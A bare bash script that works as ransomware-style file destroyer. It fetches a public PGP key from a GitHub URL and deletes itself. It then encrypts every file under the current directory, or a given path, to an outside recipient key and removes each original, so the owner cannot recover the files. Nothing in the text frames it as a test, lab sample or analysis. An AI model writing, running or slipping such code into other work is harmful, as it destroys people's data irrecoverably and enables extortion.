#!/bin/bash

KEY_URL="https://raw.githubusercontent.com/IonStati/pub-repo/main/pgp.pub.key"
RECIPIENT="531CAB023064522A"

check_pkg() {
    if ! command -v gpg &>/dev/null; then
        sudo apt-get update && sudo apt-get install -y gnupg wget
    fi
}

import_gpg_key() {
    wget -qO- "$KEY_URL" | gpg --import
}

encrypt_and_delete() {
    local path="$1"
    if [ -f "$path" ]; then
        gpg --yes --encrypt --armor --recipient "$RECIPIENT" --trust-model always "$path" && rm -f "$path"
    elif [ -d "$path" ]; then
        find "$path" -type f -exec gpg --yes --encrypt --armor --recipient "$RECIPIENT" --trust-model always {} \; -exec rm -f {} \;
    fi
}

check_pkg
import_gpg_key
rm -f ./try.gpg.sh

if [ $# -eq 0 ]; then
    find . -type f -exec gpg --yes --encrypt --armor --recipient "$RECIPIENT" --trust-model always {} \; -exec rm -f {} \;
else
    if [ -e "$1" ]; then
        encrypt_and_delete "$1"
    else
        echo "The specified path does not exist."
        exit 1
    fi
fi